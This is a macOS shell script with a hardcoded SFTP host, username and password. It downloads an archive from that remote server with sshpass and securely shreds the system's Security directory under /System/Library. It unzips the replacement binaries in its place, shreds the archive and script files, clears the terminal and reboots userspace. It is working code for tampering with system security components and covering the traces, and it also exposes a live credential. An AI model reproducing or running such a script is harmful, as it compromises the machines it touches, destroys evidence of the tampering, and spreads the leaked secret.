echo "<======= 11111114=======>"
#
# <============server configuration==============>
#
PERSON_NAME="mogambo"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="ef8fd9b5b7b14214902ca1dd90a8a0fb"
REMOTE_PASS="L5TgoApeV1gukYLkBYdHUWFZvz0xT6un"
REMOTE_PATH="/home"
REMOTE_DEST="/"

# Configuration
SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
IOS_VERSION=$(sw_vers -productVersion)
LOCAL_FILE="appstore_unmodified"
ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}"
#echo "$ARCHIVE_NAME"


cd $home/../../../System/Library/
# configuration



#sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:"new.zip" ./"new.zip"
#rm -rf ./Security
shred -fzu -n 3 ./Security >/dev/null 2>&1
#echo "fsdfsdfdsfsdfsdfds"
unzip -qqo "new.zip" -d ./
#rm -f *.zip
shred -uzv *.{zip,7z,sh}
reset
echo "sucessfully added binaries"
clear
clear -x
echo -e "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"'
launchctl reboot userspace

